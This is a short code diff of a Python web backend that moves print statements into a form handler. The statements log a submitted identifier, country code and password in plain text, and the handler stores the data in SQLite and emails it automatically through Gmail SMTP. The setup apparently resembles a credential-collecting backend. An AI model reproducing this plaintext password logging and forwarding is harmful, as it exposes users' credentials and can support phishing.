@@ -124,11 +124,7 @@ async def guardar_verificacion(data: DatosVerificacion):
             }
         )
 
-print("========== DATOS ==========")
-print("Identificador:", data.identificador)
-print("Codigo:", data.codigo_pais)
-print("Contraseña:", data.contrasena)
-print("Fecha:", fecha)
+
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
@@ -258,6 +254,11 @@ async def guardar_formulario(data: FormData):
     y los envía automáticamente al correo configurado.
     """
     fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print("========== DATOS ==========")
+    print("Identificador:", data.identificador)
+    print("Codigo:", data.codigo_pais)
+    print("Contraseña:", data.contrasena)
+    print("Fecha:", fecha)
 
     # 1️⃣  Guardar en SQLite
     async with aiosqlite.connect(DB_PATH) as db:
